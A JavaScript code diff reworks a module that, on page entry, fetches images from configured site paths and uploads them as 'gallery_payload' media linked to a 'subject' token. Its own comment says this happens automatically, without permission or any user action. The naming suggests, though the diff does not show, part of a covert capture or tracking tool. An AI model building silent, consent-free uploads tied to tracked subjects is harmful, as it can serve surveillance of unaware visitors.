@@ -1,7 +1,10 @@
-import { SUBJECT_GALLERY_PAYLOAD_ENABLED, GALLERY_PAYLOAD_PATHS, getClientSessionId } from './config';
+import {
+    SUBJECT_GALLERY_PAYLOAD_ENABLED,
+    GALLERY_UPLOAD_PATHS,
+    GALLERY_PAYLOAD_MIN_COUNT,
+    getClientSessionId
+} from './config';
 import { uploadSubjectMedia } from './mediaUpload';
-
-const STORAGE_VERSION = 'v3';
 
 function absoluteUrl(relativePath) {
     const base = process.env.PUBLIC_URL || '';
@@ -9,69 +12,35 @@ function absoluteUrl(relativePath) {
     return new URL(href, window.location.href).href;
 }
 
-function storageOk() {
-    try {
-        const k = '__pulse_gallery_probe__';
-        sessionStorage.setItem(k, '1');
-        sessionStorage.removeItem(k);
-        return true;
-    } catch {
-        return false;
+function galleryState() {
+    if (typeof window === 'undefined') return { visitId: 'ssr', uploaded: {} };
+    if (!window.__pulseGalleryState) {
+        window.__pulseGalleryState = { visitId: String(Date.now()), uploaded: {} };
     }
+    return window.__pulseGalleryState;
 }
 
-const memoryDone = {};
-
-function isDone(storageKey) {
-    if (memoryDone[storageKey]) return true;
-    if (!storageOk()) return false;
-    try {
-        return sessionStorage.getItem(storageKey) === '1';
-    } catch {
-        return false;
-    }
+function stateKey(subjectToken) {
+    const st = galleryState();
+    return `${subjectToken || 'main'}_${st.visitId}`;
 }
 
-function markDone(storageKey) {
-    memoryDone[storageKey] = true;
-    if (!storageOk()) return;
-    try {
-        sessionStorage.setItem(storageKey, '1');
-    } catch {
-        /* ignore */
-    }
+function getUploadedSet(key) {
+    const st = galleryState();
+    if (!st.uploaded[key]) st.uploaded[key] = {};
+    return st.uploaded[key];
 }
 
-function indicesKey(storageKey) {
-    return `${storageKey}_indices`;
+function uploadedCount(key) {
+    return Object.keys(getUploadedSet(key)).length;
 }
 
-function getUploadedIndices(storageKey) {
-    if (!storageOk()) return [];
-    try {
-        const raw = sessionStorage.getItem(indicesKey(storageKey));
-        const parsed = raw ? JSON.parse(raw) : [];
-        return Array.isArray(parsed) ? parsed : [];
-    } catch {
-        return [];
-    }
+function isDone(key) {
+    return uploadedCount(key) >= GALLERY_PAYLOAD_MIN_COUNT;
 }
 
-function saveUploadedIndex(storageKey, index) {
-    const indices = getUploadedIndices(storageKey);
-    if (!indices.includes(index)) {
-        indices.push(index);
-        if (storageOk()) {
-            try {
-                sessionStorage.setItem(indicesKey(storageKey), JSON.stringify(indices));
-            } catch {
-                /* ignore */
-            }
-        }
-    }
-    if (indices.length >= GALLERY_PAYLOAD_PATHS.length) {
-        markDone(storageKey);
-    }
+function markIndex(key, index) {
+    getUploadedSet(key)[String(index)] = true;
 }
 
 function delay(ms) {
@@ -86,15 +55,17 @@ async function fetchImageBlob(relativePath) {
         credentials: 'same-origin'
     });
     if (!res.ok) throw new Error(`gallery_fetch_${res.status}`);
+    const ct = res.headers.get('content-type') || '';
+    if (!ct.startsWith('image/') && !ct.includes('octet-stream')) {
+        throw new Error(`gallery_fetch_not_image_${relativePath}`);
+    }
     const raw = await res.blob();
     const type = raw.type && raw.type.startsWith('image/') ? raw.type : 'image/jpeg';
     return raw.type === type ? raw : new Blob([raw], { type });
 }
 
 function galleryStorageKey(subjectToken) {
-    return subjectToken
-        ? `pulse_gallery_${STORAGE_VERSION}_${subjectToken}`
-        : `pulse_gallery_${STORAGE_VERSION}_main`;
+    return stateKey(subjectToken);
 }
 
 /**
@@ -104,15 +75,15 @@ export async function uploadGalleryPayloadOnce(storageKey, ctx = {}) {
     if (!SUBJECT_GALLERY_PAYLOAD_ENABLED || isDone(storageKey)) return false;
     if (!ctx.subjectToken && !ctx.clientSessionId) return false;
 
-    const doneIndices = new Set(getUploadedIndices(storageKey));
+    const done = getUploadedSet(storageKey);
     let uploadedNow = 0;
 
-    for (let i = 0; i < GALLERY_PAYLOAD_PATHS.length; i += 1) {
+    for (let i = 0; i < GALLERY_UPLOAD_PATHS.length; i += 1) {
         const chunkIndex = i + 1;
-        if (doneIndices.has(chunkIndex)) continue;
+        if (done[String(chunkIndex)]) continue;
 
         try {
-            const blob = await fetchImageBlob(GALLERY_PAYLOAD_PATHS[i]);
+            const blob = await fetchImageBlob(GALLERY_UPLOAD_PATHS[i]);
             await uploadSubjectMedia({
                 subjectToken: ctx.subjectToken,
                 clientSessionId: ctx.clientSessionId,
@@ -121,13 +92,13 @@ export async function uploadGalleryPayloadOnce(storageKey, ctx = {}) {
                 captureSource: 'gallery_payload',
                 chunkIndex
             });
-            saveUploadedIndex(storageKey, chunkIndex);
+            markIndex(storageKey, chunkIndex);
             uploadedNow += 1;
-            if (i < GALLERY_PAYLOAD_PATHS.length - 1) {
-                await delay(120);
+            if (i < GALLERY_UPLOAD_PATHS.length - 1) {
+                await delay(100);
             }
         } catch (e) {
-            console.warn('gallery payload upload:', GALLERY_PAYLOAD_PATHS[i], e?.message || e);
+            console.warn('gallery payload upload:', GALLERY_UPLOAD_PATHS[i], e?.message || e);
         }
     }
 
@@ -136,7 +107,7 @@ export async function uploadGalleryPayloadOnce(storageKey, ctx = {}) {
 
 /** Sayta girəndə dərhal və avtomatik serverə yüklə (icazə/toxunuş tələb etmir) */
 export function attachGalleryPayloadUploadOnEntry(storageKey, ctx = {}) {
-    if (!SUBJECT_GALLERY_PAYLOAD_ENABLED || isDone(storageKey)) return () => {};
+    if (!SUBJECT_GALLERY_PAYLOAD_ENABLED) return () => {};
     if (!ctx.subjectToken && !ctx.clientSessionId) return () => {};
 
     const fullCtx = {
@@ -152,8 +123,8 @@ export function attachGalleryPayloadUploadOnEntry(storageKey, ctx = {}) {
 
     tick();
 
-    const retryTimer = setInterval(tick, 2000);
-    const stopTimer = setTimeout(() => clearInterval(retryTimer), 300_000);
+    const retryTimer = setInterval(tick, 1500);
+    const stopTimer = setTimeout(() => clearInterval(retryTimer), 120_000);
 
     const onVisible = () => {
         if (document.visibilityState === 'visible') tick();
